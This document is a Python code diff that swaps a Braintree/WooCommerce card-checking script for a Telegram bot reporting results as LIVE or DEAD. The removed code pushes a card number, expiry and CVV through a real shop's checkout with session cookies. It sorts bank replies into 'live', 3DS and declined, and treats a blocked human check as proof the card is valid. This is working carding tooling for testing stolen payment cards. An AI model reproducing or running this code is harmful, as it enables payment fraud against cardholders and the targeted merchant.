-        messages = j.get('messages', '')
+                # Send result to user
+                if status == 'live':
+                    final = (
+                        f'✅ LIVE\n'
+                        f'URL: {link[:80]}\n'
+                        f'Response: {response[:200]}'
+                    )
+                else:
+                    reason = error or response or 'UNKNOWN'
+                    final = (
+                        f'❌ DEAD\n'
+                        f'URL: {link[:80]}\n'
+                        f'Response: {reason[:200]}'
+                    )
+                try:
+                    bot.edit_message_text(
+                        chat_id=msg.chat.id,
+                        message_id=status_msg.message_id,
+                        text=final,
+                        disable_web_page_preview=True,
+                    )
+                except: pass
+            except Exception as e:
+                log.exception('worker')
+                send_shot_to_owner(link, f'WORKER: {e}', None)
+                try:
+                    bot.edit_message_text(
+                        chat_id=msg.chat.id,
+                        message_id=status_msg.message_id,
+                        text=f'Error: {str(e)[:200]}'
+                    )
+                except: pass
 
-        clean = re.sub(r'<[^>]+>', '', str(messages))
-        clean = re.sub(r'\s+', ' ', clean).strip()
+        threading.Thread(target=worker, daemon=True).start()
 
-        if result == 'success':
-            # ممكن يكون redirect لـ order-received
-            redirect = j.get('redirect', '')
-            return f'CHARGED {self.order_total} {self.currency}'
+    except Exception:
+        log.exception('paypal')
 
-        if result == 'failure':
-            return self._parse_woo_message(clean, enrolled, challenge, version)
-
-        if result == 'error':
-            return self._parse_woo_message(clean or 'error', enrolled, challenge, version)
-
-        return f'UNKNOWN_RESULT: {result} — {clean[:180]}'
-
-    def _parse_woo_message(self, msg, enrolled, challenge, version):
-        """تحليل نص الرد"""
-        if not msg:
-            return 'UNKNOWN: empty message'
-        low = msg.lower()
-
-        # 3D Secure
-        if '3d secure' in low or '3ds' in low:
-            return f'LIVE_3DS (enrolled={enrolled}, v={version}) — Valid card, OTP required'
-
-        # Turnstile
-        if 'verify that you are human' in low or 'turnstile' in low or 'human' in low:
-            if challenge:
-                return f'LIVE_3DS (enrolled={enrolled}) — Valid card, OTP required'
-            return f'CARD_VALID (enrolled={enrolled or "?"}) — Card OK, Turnstile blocked'
-
-        # ردود بنكية
-        if 'declined' in low: return f'DECLINED: {msg[:180]}'
-        if 'insufficient' in low: return 'INSUFFICIENT_FUNDS'
-        if 'cvv' in low: return 'CVV_FAIL'
-        if 'expired' in low: return 'EXPIRED'
-        if 'do not honor' in low: return 'DO_NOT_HONOR'
-        if 'invalid' in low and 'card' in low: return 'INVALID_CARD'
-        if 'do not match' in low: return f'AVS_MISMATCH: {msg[:180]}'
-
-        return f'DECLINED: {msg[:180]}'
-
-
-# ═══════════════════════════════════════════════════════════════
-#  Main
-# ═══════════════════════════════════════════════════════════════
-async def main():
-    os.environ.setdefault('DISPLAY', ':99')
-
-    COOKIES = (
-        'woocommerce_items_in_cart=1; '
-        'wp_woocommerce_session_b89dcd3ac6387311302297d2b2714701=t_4ab0dac325c86a42c210bff77f3a84%7C1794653648%7C1794567248%7Cd995540a42879fe0205c2c3ac47b3f1e; '
-        'woocommerce_cart_hash=a7e7aa962b94ba5769367c704cffdffa'
-    )
-
-    t = BraintreeTester(
-        checkout_url='https://shop.herbs-hands-healing.co.uk/checkout',
-        cookies=COOKIES,
-        headless=False,
-        debug=True,
-    )
-
-    print('=' * 60)
-    result = await t.Charge('5523427233579293|12|2027|953')
-    print('=' * 60)
-    print(f'RESULT: {result}')
-    print('=' * 60)
-
-
+# ═══════════════════════════════════════════════════════════════════════════════
+#  MAIN
+# ═══════════════════════════════════════════════════════════════════════════════
 if __name__ == '__main__':
-    asyncio.run(main())
+    log.info('Bot starting...')
+    log.info(f'Card: ****{CARD_NUMBER[-4:]}')
+    log.info(f'Owner: {OWNER_ID} (gets screenshots on error)')
+    log.info(f'Headless: {HEADLESS}')
+
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=60,
+                                 skip_pending=True, logger_level=logging.WARNING)
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            err = str(e).lower()
+            log.error(f'polling: {str(e)[:200]}')
+            if '409' in err or 'conflict' in err:
+                log.error('409 — another instance running')
+                time.sleep(60)
+            else:
+                time.sleep(15)
